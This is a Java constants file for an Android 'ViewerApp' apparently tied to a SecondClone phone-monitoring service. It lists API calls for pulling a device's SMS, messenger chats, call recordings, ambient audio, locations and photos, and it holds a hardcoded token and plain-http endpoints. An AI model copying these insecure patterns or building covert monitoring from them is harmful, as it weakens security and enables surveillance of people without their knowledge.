/*
  ClassName: Global.java
  @Project: ViewerApp
  @author  Lucas Walker (lucas.walker@jexpa.com)
  Created Date: 2018-06-05
  Description: Class Global is use to declare constant variables for other classes to call and use
  History:2018-10-08
          2020-08-10
          2020-09-12
  Copyright © 2018 Jexpa LLC. All rights reserved.
 */

package com.scp.viewer.API;

import android.os.Environment;

public class Global {

    public static final String TIME_DEFAULT = "1997-07-03 00:00:00";
    static final String INPUTVALUE = "InputValue";
    static final String TOKENKEY = "TokenKey";
    static final String VALUE_TOKENKEY = "23456";
    public static final String FUNCTION = "Function";
    static final String ISPUBLIC = "IsPublic";
    static final String VALUE_ISPUBLIC = "1";
    static final String ACCEPT = "Accept";
    static final String VALUE_ACCEPT = "application/json";
    static final String CONTENT_TYPE = "Content-type";
    static final String VALUE_CONTENT_TYPE = "application/json";

    /**
     * MyDatabase
     */
    public static final String TAG = "SQLite";
    // Model version
    public static String MODEL = "Android  " + android.os.Build.VERSION.RELEASE;

    /**
     * Default date format.
     */
    static final String DEFAULT_DATETIME_FORMAT = "yyyy-MM-dd HH:mm:ss";
    public static final String DEFAULT_DATE_FORMAT = "yyyy-MM-dd";
    public static final String DEFAULT_DATE_FORMAT_MMM = "MMM dd, yyyy";
    public static final String DEFAULT_TIME_FORMAT = "HH:mm:ss";
    public static final String DEFAULT_TIME_FORMAT_AM = "hh:mm aa";
    public static final String DEFAULT_TIME_START = " 00:00:00";
    public static final String DEFAULT_TIME_END = " 23:59:59";
    public static final String DEFAULT_DATETIME_FORMAT_AM = "yyyy-MM-dd hh:mm aa";
    static final String DEFAULT_DATETIME_MAX_DATE = "yyyy-MM-dd 23:59:59";
    public static final String DATE_FORMAT_NUMBER = "yyyyMMdd";

    /**
     * Time Refresh List.
     */
    public static final long LIMIT_REFRESH = 5000;
    public static long time_Refresh_Device = 534112;
    public static long time_Refresh_Setting = 534000;
    public static final long DATE = 1000 * 60 * 60 * 24;
    public static final long HOUR_MILLIS = 1000 * 60 * 60;
    public static final String MIN_TIME = "2000-05-08 00:00:00";

    /**
     * Function Name of Feature
     */
    public static final String GET_CALL_HISTORY = "GetCalls";
    public static final String GET_SMS_HISTORY = "GetSMSByDateTime";
    public static final String GET_CONTACT_HISTORY = "GetContacts";
    public static final String GET_URL_HISTORY = "GetURL";
    public static final String GET_LOCATION_HISTORY = "GetLocations";
    public static final String GET_PHOTO_HISTORY = "GetPhotos";
    public static final String GET_PHONE_CALL_RECORDING = "GetPhoneRecording";
    public static final String GET_AMBIENT_VOICE_RECORDING = "GetAmbients";
    public static final String GET_APPLICATION_USAGE = "GetApps";
    public static final String GET_APP_INSTALLATION_HISTORY = "GetAppsInstallation";
    public static final String GET_NOTES_HISTORY = "GetNotes";

    public static final String POST_CLEAR_MULTI_SMS = "DeleteMultiChatDataLog";
    public static final String POST_CLEAR_MULTI_PHONE_RECORDING = "ClearMultiPhoneRecording";
    public static final String POST_CLEAR_MULTI_AMBIENT = "ClearMultiAmbient";
    public static final String POST_CLEAR_MULTI_NOTE = "ClearMultiNote";
    public static final String POST_CLEAR_MULTI_GPS = "ClearMultiGPS";
    public static final String POST_CLEAR_MULTI_CONTACT = "ClearMultiContact";
    public static final String POST_CLEAR_MULTI_CALL = "ClearMultiCall";
    public static final String POST_CLEAR_MULTI_APP = "ClearMultiApp";
    public static final String POST_CLEAR_MULTI_URL = "ClearMultiURL";
    public static final String POST_CLEAR_MULTI_PHOTO = "ClearMultiPhoto";

    public static final String POST_CLEAR_MULTI_APP_INSTALL = "ClearMultiAppInstallation"; //2021-07-12


    /**
     * SharedPreferences
     */
    public static final String SETTINGS = "Setting";
    public static final String CONTACT_TOTAL = "Contact_Total";
    public static final String CALL_TOTAL = "Call_Total";
    public static final String PHONE_CALL_RECORDING_TOTAL = "Phone_Call_Total";
    public static final String AMBIENT_RECORDING_TOTAL = "Ambient_Recording_Total";
    public static final String URL_TOTAL = "URL_Total";
    public static final String APP_USAGE_TOTAL = "App_Usage_Total";
    public static final String APP_INSTALLATION_TOTAL = "App_Installation_Total";
    public static final String GPS_TOTAL = "GPS_Total";
    public static final String PHOTO_TOTAL = "Photo_Total";
    public static final String WHATSAPP_TOTAL = "WhatsApp_Total";
    public static final String VIBER_TOTAL = "Viber_Total";
    public static final String FACEBOOK_TOTAL = "Facebook_Total";
    public static final String SMS_TOTAL = "SMS_Total";
    public static final String SKYPE_TOTAL = "Skype_Total";
    public static final String HANGOUTS_TOTAL = "Hangouts_Total";
    public static final String MAPTYPE = "maptype";

    /**
     * SMS type
     */
    public static final String SMS_DEFAULT_TYPE = "0";
    public static final String SMS_WHATSAPP_TYPE = "1";
    public static final String SMS_INSTAGRAM_TYPE = "2";
    public static final String SMS_VIBER_TYPE = "3";
    public static final String SMS_FACEBOOK_TYPE = "4";
    public static final String SMS_SKYPE_TYPE = "5";
    public static final String SMS_HANGOUTS_TYPE = "9";
    public static final String SMS_BBM_TYPE = "10";
    public static final String SMS_LINE_TYPE = "11";
    public static final String SMS_KIK_TYPE = "12";

    /**
     * Value variable of intent class MainActivity.
     * Name Intent GPS Interval.
     * Name Intent Access Code.
     */
    public static final int REQUEST_CODE_GPS_ACCESS_CODE = 2;

    /**
     * Event onBack exit App.
     */
    public static int ON_BACK = 1;
    public static final int NumberLoad = 30;
    public static final int LENGHT = 50;

    /**
     * Distributing
     */
    public static String DEFAULT_PROTOCOL_LINK = "http://monitor-protocol-a.secondclone.com/api/apiv2";
    public static String DEFAULT_LINK_FORGETPASSWORD = "http://my.secondclone.com/Account/ForgotPassword";
    public static String DEFAULT_LINK_ABOUTUS = "http://secondclone.com/about-us/";
    public static String DEFAULT_LINK_REGISTER = "http://my.secondclone.us/Account/SignUp";
    public static String DEFAULT_LINK_RENEW = "http://my.secondclone.com/Prices";
    public static String DEFAULT_PRODUCT_NAME = "ViewerApp";
    public static String DEFAULT_VERSION_NAME = "0.8.15.0";
    public static String DEFAULT_COPYRIGHT = "Copyright © 2010-2020 SecondClone LLC. All rights reserved";
    public static String DEFAULT_LOGO_IMAGE_PATH = "https://my.secondclone.com/favicon.ico";
    public static final String File_PATH_SAVE_PHONE_CALL_RECORD = Environment.getExternalStorageDirectory() + "/" + DEFAULT_PRODUCT_NAME;
    public static final String File_PATH_SAVE_IMAGE = Environment.getExternalStorageDirectory() + "/" + DEFAULT_PRODUCT_NAME + "/Picture";


}
